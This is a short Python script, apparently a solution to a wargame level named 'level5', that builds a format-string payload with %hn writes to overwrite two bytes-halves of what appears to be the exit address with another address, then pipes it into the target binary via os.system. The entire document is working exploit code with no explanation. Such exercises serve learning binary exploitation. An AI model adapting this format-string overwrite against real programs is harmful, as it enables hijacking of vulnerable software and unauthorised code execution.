#!/usr/bin/python

import os

rubbishAddr = "AAAA"
exitAddr = "\x08\x04\x98\x38"[::-1]
exitAddr2 = "\x08\x04\x98\x3a"[::-1]
oAddr = "\x08\x04\x84\xa4"[::-1]
p = "%p."

payload = exitAddr2 + exitAddr + "%2044d" + "%4\$hn" + "%31904d" + "%5\$hn"

cmd = "echo \"" + payload + "\" -  | ~/level5"
os.system(cmd)
